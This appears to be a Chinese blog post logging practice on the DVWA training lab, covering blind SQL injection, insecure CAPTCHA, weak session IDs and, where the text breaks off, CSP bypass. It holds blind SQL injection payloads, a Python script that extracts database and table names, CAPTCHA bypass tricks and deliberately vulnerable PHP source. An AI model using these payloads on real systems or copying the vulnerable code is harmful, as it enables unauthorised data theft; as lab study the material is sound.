---
title: DVWA练习记录(三)
date: 2020-02-09 23:30:13
categories: Web
---

# SQL Injection(Blind)（SQL盲注）

SQL盲注与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。

[这篇文章](https://bbs.ichunqiu.com/thread-9668-1-1.html)总结了常见的SQL盲注场景：
1. 提交一个导致SQL查询无效时，会返回一个通用错误页面，提交正确则会返回一个内容可被适度控制的页面。
2. 提交一个导致SQL查询无效时，会返回一个通用错误页面，提交正确则会返回一个内容不可控的页面。
3. 提交受损或不正确的SQL既不会产生错误页面，也不会以任何方式影响页面输出。

<!-- more -->

举一个很形象的例子：有一个机器人，它对于问题只会回答“是”或“不是”，而盲注的目的就是通过问机器人一些问题，根据它返回的结果来判断出我们想要的数据内容。

## 安全等级`Low`

界面和一般SQL注入的界面一致，只是输入正确的ID会返回ID存在，而输入错误的ID则会返回ID不存在，不再会返回实际内容：

![](https://images.hujiekang.top/blogimage-1ccb7cc621244ccda24400dcd1edf5b2-20823164.png)

首先判断能否注入：

![](https://images.hujiekang.top/blogimage-7b6946d6b724476ac047de9c24205160-b3eab4b8.gif)

输入`1' #`，返回存在，说明没有报错，存在字符型注入。
接下来猜解用户名和当前数据库名。

这里可以使用**基于布尔的盲注**和**基于时间的盲注**两个办法。

基于布尔的盲注就是通过`substr()`、`length()`等函数，去查询字段长度、查询字段的每个字符是否为指定值，根据数据库返回的结果确定字段的值。
比如，我们可以问机器人：“数据库名称的长度是4吗？”，“数据库名称的第3个字符是`a`吗？”，“数据库里面一共有3个表对吗？”类似于这样的问题，就可以逐步判断出数据库的名称以及一些其他的信息。

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' and length(database())=4#';     /* 数据库名称的长度是4吗? */
SELECT first_name, last_name FROM users WHERE user_id = '1' and substr(database(),3,1)='a'#';     /* 数据库名称的第3个字符是a吗? */
SELECT first_name, last_name FROM users WHERE user_id = '1' and (select count(table_name) from information_schema.tables where table_schema=database())=3#';     /* 数据库里面一共有3个表对吗? */
```

基于时间的盲注就是借助`if`条件和`sleep()`函数，若满足某个条件就延时，反之直接返回。这样就可以通过页面的响应时间来判断条件是否满足。

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' and if(length(database())=4,sleep(5),1)#';   /* 数据库名称的长度是4吗? */
SELECT first_name, last_name FROM users WHERE user_id = '1' and if(substr(database(),3,1)='a',sleep(5),1)#';   /* 数据库名称的第3个字符是a吗? */
SELECT first_name, last_name FROM users WHERE user_id = '1' and if((select count(table_name) from information_schema.tables where table_schema=database())=3,sleep(5),1)#';     /* 数据库里面一共有3个表对吗? */
```

其实总的来看，两者都可以算是基于布尔的方法，因为`if`本身也是一个做布尔判断的过程。

下面简单演示猜解数据库名称的长度：

使用基于布尔的盲注：
![](https://images.hujiekang.top/blogimage-24f0b3356404581e344deffe693247e7-7383226b.gif)

使用基于时间的盲注：
![](https://images.hujiekang.top/blogimage-036fb0bbe5f6cc7c3f51c8ebc36c98be-3d5843ed.gif)

后续阶段的猜解过于麻烦，手工注入需要大量的时间，所以更好的解决办法是使用脚本。
先把每一个阶段的提交语句贴在这吧：

```sql
//数据库名称长度
id=1' and length(database())=1#
//数据库名称逐字符猜解
id=1' and ord(substr(database(),1,1))=97#
//数据库内表的个数
id=1' and (select count(table_name) from information_schema.tables where table_schema=database())=1#
//表名逐字符猜解
id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='a'#
//表内字段的列数
id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=1#
//表名逐字符猜解
id=1' and substr((select column_name from information_schema.columns where table_schema=database() and table_name='users'),1,1)='a'#
//获取查询记录条数
id=1' and (select count(user) from users)=1#
//用户名逐字符猜解
id=1' and ord(substr((select user from users),1,1))=97#
```

下面是我基于DVWA的盲注界面制作的一个猜解数据库名、用户名以及数据库下所有数据表名的小脚本，仅供参考：

```python
import requests

# 设置HTTP请求头
header = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Cookie': 'security=low; PHPSESSID=f747249d70789fd4264d382a90f45174',
    'Host': '127.0.0.1',
    'Referer': 'http://127.0.0.1/DVWA/vulnerabilities/brute/index.php',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36'
}

# 初始化数据
url = "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/"
yes = "User ID exists in the database."
no = "User ID is MISSING from the database."
ascii_dict = list(range(32, 127))
params = {
    'id': "",
    'Submit': 'Submit'
}

print("Start attacking")
print("URL: "+url)

# 猜解用户名称
for i in range(101):
    params['id'] = "1' and length(user())="+str(i)+"#"
    r = requests.get(url, params=params, headers=header)
    if r.text.find(yes) != -1:
        break

print("Start getting user() value")
user_value = ""
for j in range(1, i+1):
    for char in ascii_dict:
        params['id'] = "1' and ord(substr(user(),"+str(j)+",1))="+str(char)+"#"
        r = requests.get(url, params=params, headers=header)
        if r.text.find(yes) != -1:
            user_value += chr(char)
            print("[+]user() value: "+user_value)
            break

# 猜解数据库名称
for i in range(101):
    params['id'] = "1' and length(database())="+str(i)+"#"
    r = requests.get(url, params=params, headers=header)
    if r.text.find(yes) != -1:
        break

print("Start getting database() value")
database_value = ""
for j in range(1, i+1):
    for char in ascii_dict:
        params['id'] = "1' and ord(substr(database(),"+str(j)+",1))="+str(char)+"#"
        r = requests.get(url, params=params, headers=header)
        if r.text.find(yes) != -1:
            database_value += chr(char)
            print("[+]database() value: "+database_value)
            break

# 猜解数据库中表个数
print("Start getting table info in database()")
for i in range(101):
    params['id'] = "1' and (select count(table_name) from information_schema.tables where table_schema=database())="+str(i)+"#"
    r = requests.get(url, params=params, headers=header)
    if r.text.find(yes) != -1:
        print("number of tables in database(): "+str(i))
        break

# 猜解数据库中表名称
print("Start getting table names")
tables = []
for j in range(1, i+1):
    for k in range(101):
        params['id'] = "1' and (select length(table_name) from information_schema.tables where table_schema=database() limit "+str(j-1)+",1)="+str(k)+"#"
        r = requests.get(url, params=params, headers=header)
        if r.text.find(yes) != -1:
            tables.append(k)
            break

table_name = ""
for j in range(1, i+1):
    for i in range(1, tables[j-1]+1):
        for char in ascii_dict:
            params['id'] = "1' and ord(substr((select table_name from information_schema.tables where table_schema=database() limit "+str(j-1)+",1),"+str(i)+",1))="+str(char)+"#"
            r = requests.get(url, params=params, headers=header)
            if r.text.find(yes) != -1:
                table_name += chr(char)
                print("[+]name of table "+str(j)+": "+table_name)
                break
    tables[j-1] = table_name
    table_name = ""
```

运行结果：

![](https://images.hujiekang.top/blogimage-0a799f934f1b035fea533f5d62191446-80560c5e.png)

下面是页面源代码：

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    $id = $_GET[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

## 安全等级`Medium`

和普通的SQL注入一样，加了转义、数据改为数字型并且以`POST`方式传入。
小改一下脚本即可，将语句中的所有引号去除，将数据表名用十六进制表示，不再赘述。

源代码：

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $id = $_POST[ 'id' ];
    $id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    //mysql_close();
}

?>
```

## 安全等级`High`

`High`把参数放在了Cookie里面，并且在语句中添加了`LIMIT 1`，但是可以使用#绕过。只需要将参数放在Cookie里面即可。

```php
<?php

if( isset( $_COOKIE[ 'id' ] ) ) {
    // Get input
    $id = $_COOKIE[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Might sleep a random amount
        if( rand( 0, 5 ) == 3 ) {
            sleep( rand( 2, 4 ) );
        }

        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

## 安全等级`Impossible`

`Impossible`加了PDO，数据和代码分离，防止了SQL注入，而且添加了Anti-CSRF Token，防止了CSRF。

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();

        // Get results
        if( $data->rowCount() == 1 ) {
            // Feedback for end user
            echo '<pre>User ID exists in the database.</pre>';
        }
        else {
            // User wasn't found, so the page wasn't!
            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

            // Feedback for end user
            echo '<pre>User ID is MISSING from the database.</pre>';
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

# Insecure CAPTCHA（不安全的验证码）

CAPTCHA的全称是Completely Automated Public Turing Test to Tell Computers and Humans Apart（全自动区分计算机和人类的图灵测试），用于网站在验证一些操作是否是人为而不是机器操作时。Google就提供了这种服务，名为reCAPTCHA。其实这部分的重点并不在CAPTCHA上，而在网站程序应用CAPTCHA的过程上。因为一些验证流程的不严密，很可能导致绕过验证码，但这并不是验证码的锅，而是网站的锅……

先看看Google的reCAPTCHA的原理（下图转自<https://www.freebuf.com/articles/web/119692.html>）：

![](https://images.hujiekang.top/blogimage-3cef9c60956c91635a37c68984f53b7c-59d0e15b.png)

PHP中验证reCAPTCHA的正确性是通过`recaptcha_check_answer()`函数实现的。该函数会返回一个`ReCaptchaResponse`对象，其中包含有`$is_valid`（验证是否有效）和`$error`（错误代码）两个成员变量，用于存储验证的结果。

DVWA给了一个带reCAPTCHA验证码的密码修改界面：

![](https://images.hujiekang.top/blogimage-19703fddb962912fde5f8fea22b422bd-62381532.png)

不知道为什么，验证码总是提示密钥类型无效，更换了reCAPTCHA的公私钥也没用。不过没关系，这部分不就是要你绕开验证码么（滑稽）

## 安全等级`Low`

源代码如下：

```php
<?php

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check CAPTCHA from 3rd party
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key'],
        $_POST['g-recaptcha-response']
    );

    // Did the CAPTCHA fail?
    if( !$resp ) {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }
    else {
        // CAPTCHA was correct. Do both new passwords match?
        if( $pass_new == $pass_conf ) {
            // Show next stage for the user
            echo "
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
                <form action=\"#\" method=\"POST\">
                    <input type=\"hidden\" name=\"step\" value=\"2\" />
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
                    <input type=\"submit\" name=\"Change\" value=\"Change\" />
                </form>";
        }
        else {
            // Both new passwords do not match.
            $html     .= "<pre>Both passwords must match.</pre>";
            $hide_form = false;
        }
    }
}

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check to see if both password match
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the end user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with the passwords matching
        echo "<pre>Passwords did not match.</pre>";
        $hide_form = false;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

分析代码发现，这里验证的策略分两步走：第一步是提交reCAPTCHA验证，reCAPTCHA验证成功后返回输入框再次让用户确认；第二步是确认新密码和确认密码一致后更新数据。
由于代表验证流程的`step`参数是通过POST传输的，所以我们可以直接通过手动修改`step`的值来绕过reCAPTCHA的验证。

![](https://images.hujiekang.top/blogimage-07cb4ba392986117889753d0aefdf07a-1abd78fa.png)

同时，由于页面没有CSRF，所以可以基于这四个参数伪造一个页面，当访问时就可以自动提交修改密码请求，具体请看[CSRF模块](/2020/02/05/DVWA_1/#csrfcross-site-request-forgery%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)。

## 安全等级`Medium`

源代码：

```php
<?php

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check CAPTCHA from 3rd party
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key' ],
        $_POST['g-recaptcha-response']
    );

    // Did the CAPTCHA fail?
    if( !$resp ) {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }
    else {
        // CAPTCHA was correct. Do both new passwords match?
        if( $pass_new == $pass_conf ) {
            // Show next stage for the user
            echo "
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
                <form action=\"#\" method=\"POST\">
                    <input type=\"hidden\" name=\"step\" value=\"2\" />
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
                    <input type=\"hidden\" name=\"passed_captcha\" value=\"true\" />
                    <input type=\"submit\" name=\"Change\" value=\"Change\" />
                </form>";
        }
        else {
            // Both new passwords do not match.
            $html     .= "<pre>Both passwords must match.</pre>";
            $hide_form = false;
        }
    }
}

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check to see if they did stage 1
    if( !$_POST[ 'passed_captcha' ] ) {
        $html     .= "<pre><br />You have not passed the CAPTCHA.</pre>";
        $hide_form = false;
        return;
    }

    // Check to see if both password match
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the end user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with the passwords matching
        echo "<pre>Passwords did not match.</pre>";
        $hide_form = false;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

`Medium`添加了一个参数`passed_captcha`，用于验证用户是否验证了第一步，然而还是通过POST传参的，所以和Low的代码并没有区别，也同样可以构造CSRF攻击。

![](https://images.hujiekang.top/blogimage-af8192d1f69a4afda28b15a026febee2-e0734bba.png)

## 安全等级`High`

源代码：

```php
<?php

if( isset( $_POST[ 'Change' ] ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check CAPTCHA from 3rd party
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key' ],
        $_POST['g-recaptcha-response']
    );

    if (
        $resp ||
        (
            $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
            && $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
        )
    ){
        // CAPTCHA was correct. Do both new passwords match?
        if ($pass_new == $pass_conf) {
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );

            // Update database
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "' LIMIT 1;";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Feedback for user
            echo "<pre>Password Changed.</pre>";

        } else {
            // Ops. Password mismatch
            $html     .= "<pre>Both passwords must match.</pre>";
            $hide_form = false;
        }

    } else {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

`High`的代码看着就觉得很迷。。。
只生成了Anti-CSRF Token，但是在提交请求的时候却不检查Token是否匹配，说明CSRF依然可以进行；而且检查reCAPTCHA的结果是否正确的时候使用的是`||`，也就意味着满足后面的`$_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3' && $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'`就可以绕过验证码了。

抓包改参数，直接看结果：

![](https://images.hujiekang.top/blogimage-2e552ae7b92abf2448b39aeda4ddde3b-aa29e8ce.png)

## 安全等级`Impossible`

源代码：

```php
<?php

if( isset( $_POST[ 'Change' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_new  = stripslashes( $pass_new );
    $pass_new  = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass_new  = md5( $pass_new );

    $pass_conf = $_POST[ 'password_conf' ];
    $pass_conf = stripslashes( $pass_conf );
    $pass_conf = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_conf ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass_conf = md5( $pass_conf );

    $pass_curr = $_POST[ 'password_current' ];
    $pass_curr = stripslashes( $pass_curr );
    $pass_curr = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass_curr = md5( $pass_curr );

    // Check CAPTCHA from 3rd party
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key' ],
        $_POST['g-recaptcha-response']
    );

    // Did the CAPTCHA fail?
    if( !$resp ) {
        // What happens when the CAPTCHA was entered incorrectly
        echo "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }
    else {
        // Check that the current password is correct
        $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
        $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
        $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
        $data->execute();

        // Do both new password match and was the current password correct?
        if( ( $pass_new == $pass_conf) && ( $data->rowCount() == 1 ) ) {
            // Update the database
            $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
            $data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
            $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
            $data->execute();

            // Feedback for the end user - success!
            echo "<pre>Password Changed.</pre>";
        }
        else {
            // Feedback for the end user - failed!
            echo "<pre>Either your current password is incorrect or the new passwords did not match.<br />Please try again.</pre>";
            $hide_form = false;
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

`Impossible`里面的做的防护措施如下：
1. Anti-CSRF Token（终于记起来要检查Token了）
2. PDO和输入字符转义（查询语句中代码和数据严格分开，防止了SQL注入）
3. 验证码的验证流程（只有`recaptcha_check_answer()`的返回对象为`true`才算是通过了验证）

事实证明，最简单的往往是最有效的。。。人家Google给你提供好的验证结果偏不用，还要用一些别的手段来验证，这就直接导致了验证码的绕过。

# Weak Session IDs（弱会话ID）

Session ID（会话ID），是一种在网页会话中标识用户身份的标记串。用户每次登录网页时，服务器分配给用户一个唯一的字符串用于标识用户，从而精准的为用户提供对应的信息。但是若Session ID过于简单，就容易被他人窃取并仿冒身份，容易带来意想不到的后果。

DVWA界面上给了一个按钮，并告诉你点击按钮就会生成一个名叫`dvwaSession`的Cookie作为Session ID。

![](https://images.hujiekang.top/blogimage-f474ea305df3e04b3a2ddadc552afae4-d352e88f.png)

## 安全等级`Low`

先不看代码，直接抓包看看：

![](https://images.hujiekang.top/blogimage-b13252db17b6ff6dc1734523ab583ed9-18e68344.png)

抓包后发现Session ID是顺序递增的，也就是说在真实的环境下，小于我们获取到的ID的所有ID都可以认为是一个会话中的用户，我们只需要修改为对应的Session ID即可。

查看源代码，发现果然是从0开始递增的：

```php
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id'])) {
        $_SESSION['last_session_id'] = 0;
    }
    $_SESSION['last_session_id']++;
    $cookie_value = $_SESSION['last_session_id'];
    setcookie("dvwaSession", $cookie_value);
}
?>
```

## 安全等级`Medium`

抓包查看，很容易看出这是时间戳的格式。
> 时间戳是指格林威治时间 `1970 年 01 月 01 日 00 时 00 分 00 秒`（北京时间 `1970 年 01 月 01 日 08 时 00 分 00 秒`）起至现在的**总毫秒数。**
> 通俗的讲， 时间戳是一份能够表示一份数据在一个特定时间点已经存在的完整的可验证的数据。

将其转换为时间如下：

![](https://images.hujiekang.top/blogimage-92eab4cf2103e2ebb521c618bf3a7bd2-da33b500.png)

于是猜测程序将用户的登录时间对应的时间戳作为了Session ID。这样首先存在重复问题，若多个用户在同一个时间点登录，那么分配到的Session ID将会相同，服务端也就无法辨别出这几个用户；其次很容易被仿冒，只需要随机输入一个时间戳，就可能对应着一个会话。

源代码：

```php
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $cookie_value = time();   //生成时间戳
    setcookie("dvwaSession", $cookie_value);
}
?>
```

## 安全等级`High`

抓包发现Cookie里没有`dvwaSession`项。于是查看浏览器的Cookie栏，发现Session ID变成了一种加密的格式，且限制了有效时间、有效域名和有效路径：

![](https://images.hujiekang.top/blogimage-40942d76b7450c09779fe42da3b4120a-504129d6.png)

尝试使用md5解密，发现很容易就被解出来了：

![](https://images.hujiekang.top/blogimage-39e1f69e1453a2c0ccebe57ee03f60ee-e44f08b2.png)

再次生成后尝试解密，发现解密的结果又是递增的：

![](https://images.hujiekang.top/blogimage-dbe253daf7b2a0fe7bf03ad3f623a833-9f8fdb42.png)

于是可猜测：Session ID是将从0递增的整数用md5加密之后设定了过期时间为一小时、指定了访问路径之后添加进Cookie中的。依然很容易被仿冒。
查看源代码，果然如此：

```php
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id_high'])) {
        $_SESSION['last_session_id_high'] = 0;
    }
    $_SESSION['last_session_id_high']++;
    $cookie_value = md5($_SESSION['last_session_id_high']);
    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], false, false);
}

?>
```

## 安全等级`Impossible`

`Impossible`中采用了使用sha1加密后的随机数+时间戳+固定字符串的组合作为Session ID。由于sha1加密内容足够复杂，所以解密就较为困难。当然，实际生产环境中，这个固定的字符串一定要妥善保管，否则也存在风险。
除此之外，在`setcookie()`函数中的一些参数也有了改变：
- 参数1：Cookie名称，这里为`dvwaSession`
- 参数2：Cookie对应的值，这里即`sha1(mt_rand().time()."Impossible")`的值
- 参数3：Cookie过期时间，为一个Unix时间戳，这里为`time()+3600`，即一个小时后过期
- 参数4：Cookie有效的路径，这里为`/vulnerabilities/weak_id/`
- 参数5：Cookie有效的域名，这里为`$_SERVER['HTTP_HOST']`，即`127.0.0.1`
- 参数6：是否设置Cookie为仅通过安全的HTTPS连接传输，这里为`true`，而`High`等级中的值为`false`
- 参数7：是否为Cookie设置`httponly`，即Cookie仅可通过HTTP协议访问，无法通过脚本语言访问，防止了XSS攻击盗窃身份的可能，这里设置为`true`，而`High`等级中为`false`

下面是源代码：

```php
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $cookie_value = sha1(mt_rand() . time() . "Impossible");
    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], true, true);
}
?>
```

# CSP Bypass（内容安全策略绕过）

CSP（Content-Security-Policy，内容安全策略）是一种对浏览器在加载外部资源上的的限制，可以防止一些XSS攻击。CSP的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。
更详细的介绍，可参见阮一峰老师的文章<http://www.ruanyifeng.com/blog/2016/09/csp.html>。

## 安全等级`Low`

页面提示可以检查CSP，然后输入一个外部脚本并包括在网页中：

![](https://images.hujiekang.top/blogimage-d47b8aabd54d7bc801357411ef6b20d7-655665e6.png)

于是查看CSP，发现允许包含来自`https://pastebin.com`、`example.com`、jQuery、和Google Analytics的脚本。
